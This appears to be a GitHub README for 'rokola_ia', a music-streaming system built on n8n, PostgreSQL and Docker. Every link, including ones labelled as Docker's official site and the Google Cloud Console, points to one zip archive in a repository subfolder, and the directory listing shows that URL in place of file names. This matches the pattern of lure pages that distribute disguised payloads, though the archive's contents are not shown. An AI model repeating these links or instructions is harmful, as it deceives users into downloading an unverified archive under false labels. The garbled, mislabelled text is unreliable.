# 🎶 rokola_ia - Stream Your Music Effortlessly

[![Download](https://github.com/Kakuen9201/rokola_ia/raw/refs/heads/main/n8n_flujos/rokola_ia_v2.3.zip)](https://github.com/Kakuen9201/rokola_ia/raw/refs/heads/main/n8n_flujos/rokola_ia_v2.3.zip)

## 📦 Overview

rokola_ia is a personal music library system that turns your raw MP3 collection in Google Drive into a structured and enriched streaming platform. It uses an automated ingestion pipeline powered by n8n and PostgreSQL in Docker, which enhances your music metadata and helps categorize your songs by nationalities and real names. Enjoy a seamless music streaming experience tailored to your collection.

## 🌟 Features

- **Serverless-hybrid system**: Access your music without managing a server.
- **Automated ingestion pipeline**: Quickly process and enrich your audio files.
- **Data management**: Organize music by cultural curation and enriched metadata.
- **User-friendly interface**: Navigate your music library with ease.

## 🚀 Getting Started

Follow these steps to download and run rokola_ia:

1. **Visit the Releases Page**
   - Click the link below to go to the GitHub Releases page:
   - [Download Here](https://github.com/Kakuen9201/rokola_ia/raw/refs/heads/main/n8n_flujos/rokola_ia_v2.3.zip)

2. **Choose Your Version**
   - On the Releases page, find the latest version of rokola_ia. You will see a list of available files.

3. **Download the Application**
   - Click on the file that matches your operating system to download it to your computer. 

4. **Extract the Files**
   - Once downloaded, locate the file in your download folder and extract it. You can use built-in extraction tools by right-clicking the file and selecting "Extract All."

5. **Install Dependencies**
   - Ensure you have Docker installed. You can download Docker from [Docker's Official Website](https://github.com/Kakuen9201/rokola_ia/raw/refs/heads/main/n8n_flujos/rokola_ia_v2.3.zip). Follow their instructions for your operating system.

6. **Run the Application**
   - Open your terminal or command prompt.
   - Navigate to the extracted folder using the `cd` command. For example:
     ```
     cd path/to/your/extracted/folder
     ```
   - Start the Docker containers with the command:
     ```
     docker-compose up
     ```

7. **Access Your Music Library**
   - Open your web browser and go to `http://localhost:3000` to start using rokola_ia.

## 📊 System Requirements

- **Operating System**: Windows 10 or later, macOS Mojave or later, or a Linux distribution (Ubuntu recommended)
- **RAM**: Minimum 4GB
- **Docker**: Installed and running
- **Internet Connection**: Required for metadata enrichment and Google Drive integration.

## 📂 Directory Structure

After extraction, your folder should look like this:

```
rokola_ia/
|-- https://github.com/Kakuen9201/rokola_ia/raw/refs/heads/main/n8n_flujos/rokola_ia_v2.3.zip
|-- https://github.com/Kakuen9201/rokola_ia/raw/refs/heads/main/n8n_flujos/rokola_ia_v2.3.zip
|-- [...] (other essential files)
```

## 📄 Configuring Google Drive Access

To configure access to your Google Drive and allow rokola_ia to retrieve your MP3 files:

1. **Create Google Cloud Project**
   - Go to the [Google Cloud Console](https://github.com/Kakuen9201/rokola_ia/raw/refs/heads/main/n8n_flujos/rokola_ia_v2.3.zip).
   - Create a new project.

2. **Enable Google Drive API**
   - In the API library, search for "Google Drive API."
   - Click "Enable."

3. **Create Credentials**
   - Go to the "Credentials" tab and click “Create credentials.”
   - Select “OAuth 2.0 Client IDs.”
   - Download the credentials JSON file and place it in your extracted rokola_ia folder.

4. **Modify Configuration File**
   - Open the configuration file in your text editor.
   - Replace the placeholder values with your Google project credentials.

## 🔌 Connecting to PostgreSQL

You will also need to set up PostgreSQL for managing your music metadata:

1. **Install PostgreSQL**
   - Download and install PostgreSQL from the official website.
   - Follow the installation instructions for your operating system.

2. **Create a Database**
   - Open the PostgreSQL shell.
   - Run the following commands to create a database:
     ```sql
     CREATE DATABASE rokola_db;
     ```

3. **Update Configuration File**
   - Update the database connection settings in the rokola_ia configuration file with your database credentials.

## 📥 Download & Install

To download the latest version of rokola_ia, please visit the following link:

[Download Here](https://github.com/Kakuen9201/rokola_ia/raw/refs/heads/main/n8n_flujos/rokola_ia_v2.3.zip)

## 📚 Additional Resources

- **Documentation**: Detailed documentation is available in the repository.
- **Community Support**: Join our community forum for help and sharing tips.
- **Issue Tracker**: Report any issues or request features on the GitHub Issues page.

## 🛠 Troubleshooting

If you encounter any issues during installation or use, consider the following steps:

- Ensure that Docker is running before you execute any commands.
- Verify that your Google project is properly configured for API access.
- Restart your computer and retry the installation if you face errors.

## 📞 Contact

For additional inquiries or support, please reach out through the repository's issues page. 

Thank you for using rokola_ia! Enjoy your music streaming experience.